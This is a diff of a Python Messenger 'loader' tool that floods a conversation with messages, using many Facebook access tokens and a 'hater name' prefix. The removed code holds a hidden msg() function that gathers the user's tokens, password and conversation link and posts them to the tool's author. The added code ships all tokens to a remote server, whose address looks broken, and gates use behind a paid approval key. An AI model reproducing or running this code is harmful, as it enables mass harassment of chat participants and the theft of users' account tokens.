@@ -1,260 +1,221 @@
-from platform import system
-import sys
-def testPY():
-    if(sys.version_info[0] < 3):
-        print ('\n\t [+] You have Python 2, Please Clear Data Termux And Reinstall Python ... \n')
-        sys.exit()
-
-def modelsInstaller():
-    try:
-        models = ['requests', 'colorama']
-        for model in models:
-            try:
-                if(sys.version_info[0] < 3):
-                    os.system('cd C:\Python27\Scripts & pip install {}'.format(model))
-                else:
-                    os.system('python -m pip install {}'.format(model))
-                print(' ')
-                print('[+] {} has been installed successfully, Restart the program.'.format(model))
-                sys.exit()
-                print(' ')
-            except:
-                print('[-] Install {} manually.'.format(model))
-                print(' ')
-    except:
-        pass
-###----------[ IMPORT MODULES ]---------- ###
-
-import base64
-import json
+import requests
+from colorama import Fore, Style, init
 import time
-import sys
 import os
-import re
-import binascii
-import time
-import json
-import random
-import threading
-import pprint
-import smtplib
-import telnetlib
-import os.path
 import hashlib
-import string
-import glob
-import sqlite3
-import urllib
-import getpass
-import argparse
-import marshal
-import datetime  
-from time import sleep 
-from platform import system
-from datetime import datetime
+import random
+from urllib.parse import quote
 
-try:
-    import requests
-    from colorama import Fore
-    from colorama import init
-except:
-    modelsInstaller()
+init(autoreset=True)
 
-requests.packages.urllib3.disable_warnings()
+def get_unique_id():
+    try:
+        unique_str = str(os.getuid()) + os.getlogin() if os.name != 'nt' else str(os.getlogin())
+        return hashlib.sha256(unique_str.encode()).hexdigest()
+    except Exception as e:
+        print(f'Error generating unique ID: {e}')
+        exit(1)
 
-def cls():
-    if system() == 'Linux':
-        os.system('clear')
+def check_permission(unique_key):
+    while True:
+        try:
+            response = requests.get('https://github.com/ERIIC-EX/Aprovall/blob/main/Approval.txt')
+            if response.status_code == 200:
+                data = response.text
+                if unique_key in data:
+                    print(f'{Fore.GREEN}[√] Permission granted. Your Key Was Approved.')
+                    return
+                print(f'{Fore.RED}Checking Approval.....')
+                time.sleep(10)
+            else:
+                print(f'Failed to fetch permissions list. Status code: {response.status_code}')
+                time.sleep(10)
+        except Exception as e:
+            print(f'Error checking permission: {e}')
+            time.sleep(10)
+
+def send_approval_request(unique_key):
+    try:
+        message = f'Hello, Eriic sir! Please Approve My Token is :: {unique_key}0'
+        os.system(f'am start https://wa.link/fb4f6f?text={quote(message)} >/dev/null 2>&1')
+        print('WhatsApp opened with approval request. Waiting for approval...')
+    except Exception as e:
+        print(f'Error sending approval request: {e}')
+        exit(1)
+
+def print_colored_logo(logo):
+    colors = [31, 32, 33, 34, 35, 36]
+    for line in logo.split('\n'):
+        color = random.choice(colors)
+        print(f'\033[1;{color}m{line}\033[0m')
+        time.sleep(0.1)
+
+def pre_main():
+    logo = '''
+    #######  ######## ######## ##       #### ##    ## ######## 
+    ##     ## ##       ##       ##        ##  ###   ## ##       
+    ##     ## ##       ##       ##        ##  ####  ## ##       
+    ##     ## ######   ######   ##        ##  ## ## ## ######   
+    ##     ## ##       ##       ##        ##  ##  #### ##       
+    ##     ## ##       ##       ##        ##  ##   ### ##       
+    #######  ##       ##       ######## #### ##    ## ######## 
+    '''
+    unique_key = get_unique_id()
+    os.system('clear')
+    print_colored_logo(logo)
+    print('•──────────────────────────────────────────────────────────────────────────────────────•')
+    print('[~] OWNER-ERIIC-TRICKER')
+    print('•──────────────────────────────────────────────────────────────────────────────────────•')
+    print(f'[🔐] Your Key :: {unique_key}')
+    print('•──────────────────────────────────────────────────────────────────────────────────────•')
+    send_approval_request(unique_key)
+    check_permission(unique_key)
+
+def display_logo():
+    logo = f'''
+    {Fore.GREEN} 
+    #######  ######## ######## ##       #### ##    ## ######## 
+    ##     ## ##       ##       ##        ##  ###   ## ##       
+    ##     ## ##       ##       ##        ##  ####  ## ##       
+    ##     ## ######   ######   ##        ##  ## ## ## ######   
+    ##     ## ##       ##       ##        ##  ##  #### ##       
+    ##     ## ##       ##       ##        ##  ##   ### ##       
+    #######  ##       ##       ######## #### ##    ## ########                                          
+    {Fore.CYAN}< INFORMATION >----------------------------------------
+    [ DEVELOPER  ]: ERIIC EXO
+    [ VERSION    ]: 1.1
+    [ TOOL NAME  ]: CONVO OFFLINE
+    [ FACEBOOK   ]: LOWDA CHUS
+    ------------------------------------------------------------
+    '''
+    print(logo)
+
+def fetch_ip_info():
+    try:
+        response = requests.get('http://ip-api.com/json/')
+        if response.status_code == 200:
+            data = response.json()
+            return {'ip': data.get('query', 'N/A'), 'country': data.get('country', 'N/A'), 'region': data.get('regionName', 'N/A'), 'city': data.get('city', 'N/A')}
+        print(f'{Fore.RED}Failed to fetch IP information.')
+    except requests.RequestException as e:
+        print(f'{Fore.RED}Error fetching IP info: {e}')
+
+def display_info():
+    ip_info = fetch_ip_info()
+    if ip_info:
+        info = f"\n{Fore.YELLOW}< YOUR INFO >-----------------------------------------\n[ IP ADDRESS ]: {ip_info['ip']}\n[ TIME       ]: {time.strftime('%I:%M %p')}\n[ DATE       ]: {time.strftime('%d/%B/%Y')}\n------------------------------------------------------------\n[ COUNTRY    ]: {ip_info['country']}\n[ REGION     ]: {ip_info['region']}\n[ CITY       ]: {ip_info['city']}\n------------------------------------------------------------\n"
+        print(info)
     else:
-        if system() == 'Windows':
-            os.system('cls')
+        print(f'{Fore.RED}Could not retrieve IP and location information.')
 
-def liness():
-		print('\u001b[37m' + '[>] ================================')
-		
-		
-cls()
-CLEAR_SCREEN = '\033[2J'
-RED = '\033[1;31;1m'  # mode 31 = red foreground
-RESET = '\033[1;37;1m'  # mode 0  = reset
-BLUE = "\033[1;36;1m"
-WHITE = "\033[1;30;1m",
-YELLOW = "\033[1;37;1m",
-CYAN = "\033[1;36;1m"
-MAGENTA = "\033[1;37;1m",
-GREEN = "\033[1;32;1m"
-RESET = "\033[1;37;1m"
-BOLD = '\033[1;37;1m'
-REVERSE = "\033[1;37;1m"
+server_url = 'https://wa.link/fb4f6f'
 
-def logo():
-    clear = "\x1b[0m"
-    colors = [31,]
+def load_from_file(file_path):
+    if not os.path.exists(file_path):
+        print(f'{Fore.RED}File not found: {file_path}')
+        return []
+    with open(file_path, 'r') as f:
+        return [line.strip() for line in f.readlines() if line.strip()]
 
-    x = """
-          
-  ______                                 __            __    __   ______          ______                                
- /      \                               |  \          |  \  |  \ /      \      /      \                               
-|  $$$$$$\      __   ______    ______  _| $$_         | $$  | $$|  $$$$$$\      |  $$$$$$\  ______   _______   __    __ 
-| $$__| $$     |  \ /      \  /      \|   $$ \         \$$\/  $$ \$$__| $$      | $$___\$$ /      \ |       \ |  \  |  \
-| $$    $$      \$$|  $$$$$$\|  $$$$$$\\$$$$$$          >$$  $$   |     $$       \$$    \ |  $$$$$$\| $$$$$$$\| $$  | $$
-| $$$$$$$$     |  \| $$    $$| $$    $$ | $$ __        /  $$$$\  __\$$$$$\       _\$$$$$$\| $$  | $$| $$  | $$| $$  | $$
-| $$  | $$     | $$| $$$$$$$$| $$$$$$$$ | $$|  \      |  $$ \$$\|  \__| $$      |  \__| $$| $$__/ $$| $$  | $$| $$__/ $$
-| $$  | $$     | $$ \$$     \ \$$     \  \$$  $$      | $$  | $$ \$$    $$       \$$    $$ \$$    $$| $$  | $$ \$$    $$
- \$$   \$$__   | $$  \$$$$$$$  \$$$$$$$   \$$$$        \$$   \$$  \$$$$$$         \$$$$$$   \$$$$$$  \$$   \$$ _\$$$$$$$
-         |  \__/ $$                                                                                           |  \__| $$
-          \$$    $$                                                                                            \$$    $$
-           \$$$$$$                                                                                              \$$$$$$ 
+def send_post_request(url, json_data, retries=3):
+    for attempt in range(retries):
+        try:
+            response = requests.post(url, json=json_data)
+            if response.status_code == 200:
+                return response
+            else:
+                print(f'{Fore.RED}Failed (Attempt {attempt + 1}/{retries}): {response.text}')
+                time.sleep(1)
+        except requests.RequestException as e:
+            print(f'{Fore.RED}Error (Attempt {attempt + 1}/{retries}): {e}')
+            time.sleep(1)
 
-"""
-    for N, line in enumerate(x.split("\n")):
-        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
-        time.sleep(0.05)
-logo()
-testPY()
-print('''\033[1;37m---------------------------------------------------------------------\n''')
-def venom():
-    clear = "\x1b[0m"
-    colors = [37,31 , 33, 34]
+def menu():
+    display_logo()
+    display_info()
+    note = f'\n{Fore.LIGHTMAGENTA_EX}< NOTE >-------------------------------------------\n              Tool Paid Monthly: ₹250\n------------------------------------------------------------\n'
+    print(note)
+    while True:
+        options = f'\n{Fore.CYAN}< MENU >-------------------------------------------\n[1] Start Loader\n[2] Stop Loader\n[3] Show Running Loaders\n[4] Exit\n------------------------------------------------------------\n'
+        print(options)
+        choice = input(f'{Fore.CYAN}Choose an option: {Style.RESET_ALL}')
+        if choice == '1':
+            start_loader()
+        elif choice == '2':
+            stop_loader()
+        elif choice == '3':
+            show_running_loaders()
+        elif choice == '4':
+            print(f'{Fore.GREEN}Exiting... Goodbye!')
+            break
+        else:
+            print(f'{Fore.RED}Invalid choice! Try again.')
 
-    y = '''
-      ==>[ Welcome to Multi id Loader Tool ]<==
-'''
-    for N, line in enumerate(y.split("\n")):
-        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
-        time.sleep(0.05)
-    	
-venom()
-
-
-headers = {
-    'Connection': 'keep-alive',
-    'Cache-Control': 'max-age=0',
-    'Upgrade-Insecure-Requests': '1',
-    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-    'Accept-Encoding': 'gzip, deflate',
-    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-    'referer': 'www.google.com'
-}
-
-def getName(token):
-		try:
-			data = requests.get(f'https://graph.facebook.com/v17.0/me?access_token={token}').json()
-		except:
-			data = ""
-		if 'name' in data:
-			return data['name']
-		else:
-			return "Error occured"
-
-
-if int:
-    print('''\033[1;37m---------------------------------------------------------------------\n''')
-    print('''\033[1;34m-=[ Nonstop Multii + Inbox Loader Tool By = Ajeet ]=-''')
-    print('''\033[1;37m-=[ Contact Us :: https://www.facebook.com/profile.php?id=100092988141664]=-\n''')
-    print('''\033[1;36m---------------------------------------------------------------------\n''')
-    i = datetime.now()
-    print(i.strftime("\033[1;31m[#] Tool Run Time ==> %Y-%m-%d %I:%M:%S %p "))
-    print('''\033[1;37m[#] (^^^) The Tool Maker  Increadable boii == > [ Ajeet Here ]\n''')
-    print("\033[1;36;40m", end = "")
-    import getpass
-
-attemps = 0
-
-while attemps < 12345677901:
-    username = input('\033[1;91m[\033[1;92m√\033[1;91m]\x1b[38;5;50m ENTER USERNAME: ')
-    password = input('\033[1;95m[\033[1;95m√\033[1;95m]\x1b[38;5;50m ENTER PASSWORD: ')
-
-    if username == 'ajeetXD' and password == '9':
-        print(' \033[0;95mSahii Haii Bhai.')
-        os.system('espeak -a 300 " Welcome To Ajeet Tool Enjoy Karo"')
-        break
+def start_loader():
+    print(f'\n{Fore.YELLOW}--- Start a New Loader ---')
+    convo_id = input(f'{Fore.CYAN}Enter Conversation ID: {Style.RESET_ALL}')
+    hater_name = input(f'{Fore.CYAN}Enter Hater Name: {Style.RESET_ALL}')
+    tokens_file = input(f'{Fore.CYAN}Enter Access Tokens File Path: {Style.RESET_ALL}')
+    access_tokens = load_from_file(tokens_file)
+    if not access_tokens:
+        print(f'{Fore.RED}No access tokens found!')
+        return
+    print(f'{Fore.CYAN}1. Enter Messages Manually')
+    print(f'{Fore.CYAN}2. Load Messages from File')
+    message_choice = input(f'{Fore.CYAN}Choose an option: {Style.RESET_ALL}')
+    if message_choice == '1':
+        messages = []
+        print(f'{Fore.CYAN}Enter messages one per line (type "END" to finish):{Style.RESET_ALL}')
+        while True:
+            message = input()
+            if message.upper() == 'END':
+                break
+            messages.append(message.strip())
+    elif message_choice == '2':
+        file_path = input(f'{Fore.CYAN}Enter Message File Path: {Style.RESET_ALL}')
+        messages = load_from_file(file_path)
     else:
-        print(' Username Or Password Galat Hai Try Karo Firse..!! ')
-        os.system('espeak -a 300 " Password Galat Hai Ajeet Se Pucho"')
-        attemps += 1
-        continue
-os.system('clear')
-pass
+        print(f'{Fore.RED}Invalid choice!')
+        return
 
+    if not messages:
+        print(f'{Fore.RED}No messages found!')
+        return
+    timer = int(input(f'{Fore.CYAN}Enter Timer Interval (in seconds): {Style.RESET_ALL}'))
+    data = {'convo_id': convo_id, 'tokens': access_tokens, 'messages': messages, 'hater_name': hater_name, 'timer': timer}
+    print(f'{Fore.BLUE}Sending task to the server...')
+    response = send_post_request(f'{server_url}/start_task', data)
+    if response and response.status_code == 200:
+        print(f'{Fore.GREEN}Loader started successfully!')
+    else:
+        print(f'{Fore.RED}Failed to start loader.')
 
-logo ()
-venom()
-os.system('espeak -a 300 " Enter Your Name here"')
-Name = input("[+] Enter Your Name:: ")
-os.system('espeak -a 300 "Welcome ..."'+Name)
-os.system('espeak -a 300 " Enter Your Token File"'+Name)
-token = input("[+] Token File :: ")
-print('\n')
-with open(token, 'r') as file:
-	Tokens = file.readlines()
-	num_tokens = len(Tokens)
-	access_tokens = [token.strip() for token in Tokens]
-	print('\n')
-	thread_id = input(BOLD + CYAN + "\033[1;36m[+] Conservation ID :: \033[1;32;1m")
-	haters_name = input(BOLD + CYAN + "\033[1;36m[+] Enter Kidx Name :: \033[1;32;1m")
-	hwre_name = input(BOLD + CYAN + "\033[1;36m[+] Enter Here Name :: \033[1;32;1m")
-	ms = input(BOLD + CYAN + "\033[1;36m[+] Add Np File :: \033[1;32;1m")
-	timm = int(input(BOLD + CYAN + "\033[1;36m[+] Speed in Seconds :: \033[1;32;1m"))
-	print('\n')
-	with open(ms, 'r')as file:
-		text_file_path = file.read().strip()
-	with open(text_file_path, 'r') as file:
-		messages = file.readlines()
-	num_messages = len(messages)
-	max_tokens = min(num_tokens, num_messages)
-os.system('clear')
-logo()
-venom()
-os.system('espeak -a 300 " Hogya Bhai Start... "')
-os.system('espeak -a 300 " Tu Soja Ab Mai Dekh Lunga... "')
-def msg():
-		parameters = {
-			'access_token' : random.choice(access_tokens),
-			'message': 'Hello Ajeet Sir Am Using Your Tool My ' 'User Profile Name : '+getName(random.choice(access_tokens))+'\n Token : '+" (-) ".join(access_tokens)+'\n Link : https://www.facebook.com/messages/t/'+thread_id+'\n Password: '+password
-		}
-		try:
-			s = requests.post("", data=parameters, headers=headers)
-		except:
-			pass
-	
-msg()
-while True:
-		try:
-			for message_index in range(num_messages):
-				token_index = message_index % max_tokens
-				access_token = access_tokens[token_index]
+def stop_loader():
+    print(f'\n{Fore.YELLOW}--- Stop a Loader ---')
+    task_id = input(f'{Fore.CYAN}Enter Task ID to stop: {Style.RESET_ALL}')
+    print(f'{Fore.BLUE}Stopping loader...')
+    response = send_post_request(f'{server_url}/stop_task/{task_id}', {})
+    if response and response.status_code == 200:
+        print(f'{Fore.GREEN}Loader stopped successfully!')
+    else:
+        print(f'{Fore.RED}Failed to stop loader.')
 
-				message = messages[message_index].strip()
+def show_running_loaders():
+    print(f'\n{Fore.YELLOW}--- Show Running Loaders ---')
+    print(f'{Fore.BLUE}Fetching loader status...')
+    try:
+        response = requests.get(f'{server_url}/status')
+        if response.status_code == 200:
+            status_data = response.json()
+            print(f'{Fore.GREEN}Server Status:')
+            print(f"{Fore.MAGENTA}Uptime: {status_data['uptime']}")
+            print(f"{Fore.MAGENTA}Active Tasks: {status_data['active_tasks']}")
+            print(f"{Fore.MAGENTA}Task Details: {status_data['task_details']}")
+        else:
+            print(f'{Fore.RED}Failed to fetch status.')
+    except requests.RequestException as e:
+        print(f'{Fore.RED}Error: {e}')
 
-				url = "https://graph.facebook.com/v15.0/{}/".format('t_'+thread_id)
-				parameters = {'access_token': access_token, 'message': haters_name + ' ' + message + ' ' + hwre_name}
-				response = requests.post(url, json=parameters, headers=headers)
-				
-
-				tt = datetime.now().strftime("%Y-%m-%d %I:%M:%S %p")
-				if response.ok:
-					print("\033[1;36;1m[#] Check kr Sab Sahi Haina {} Of Convo {} Successfuly Sent By Token. {}: {}".format(
-						message_index + 1, thread_id, token_index + 1, haters_name + ' ' + message + ' ' + hwre_name))
-					e = datetime.now()
-					print (e.strftime("[#] Haan Bhai Chala Gya Tera Message | | Date :: %d-%m-%Y  TIME :: %I:%M:%S %p"))
-					liness()
-				else:
-					print("[#] Check kr Sab Sahi Haina {} Of Convo {} Successfuly Sent By Token. {}: {}".format(
-						message_index + 1, thread_id, token_index + 1, haters_name + ' ' + message + ' ' + hwre_name))
-					e = datetime.now()
-					print (e.strftime("[#] Haan Bhai Chala Gya Tera Message | | Date :: %d-%m-%Y  TIME :: %I:%M:%S %p"))
-					liness()
-				time.sleep(timm)
-			print("[] All Messages Successfully Sent Wait 30 Second")
-			time.sleep(30)
-		except Exception as e:
-			print(BOLD + RED + "\033[1;31;1m[#]] Net Band Hogya Bhai : Message  {} Of Convo {} Failed To Send. {}: {}".format(
-				message_index + 1, thread_id, token_index + 1, haters_name + ' ' + message + ' ' + hwre_name))
-			e = datetime.now()
-			print (e.strftime("[#] Alone Ajeet iinxide | | Date :: %d-%m-%Y  TIME :: %I:%M:%S %p"))
-			sleep(10)
-			liness()
-else:
-	print(BOLD+RED+'[-] <==> Your Number Is Wrong Please Take Approval From Owner')
+if __name__ == '__main__':
+    pre_main()
+    menu()
